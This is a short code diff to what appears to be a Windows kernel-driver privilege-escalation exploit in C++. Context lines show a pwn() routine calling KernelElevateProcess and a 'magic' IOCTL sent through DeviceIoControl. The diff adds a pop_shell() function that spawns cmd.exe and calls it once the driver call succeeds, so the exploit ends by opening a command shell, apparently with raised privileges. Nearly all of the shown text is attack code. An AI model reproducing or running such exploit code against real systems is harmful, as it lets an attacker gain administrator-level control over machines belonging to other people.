@@ -10,6 +10,18 @@
 
 int processId = GetCurrentProcessId();
 
+void pop_shell()
+{
+	STARTUPINFO si = { sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+}
+
 void pwn()
 {
 	KernelElevateProcess(processId);
@@ -64,6 +76,8 @@ int main()
 			if (DeviceIoControl(handle, magic, &target, sizeof(buffer), &output, outputSize, (LPDWORD)&size, NULL))
 			{
 				std::cout << "Received bytes: " << size << std::endl;
+				
+				pop_shell();
 			}
 			else
 			{
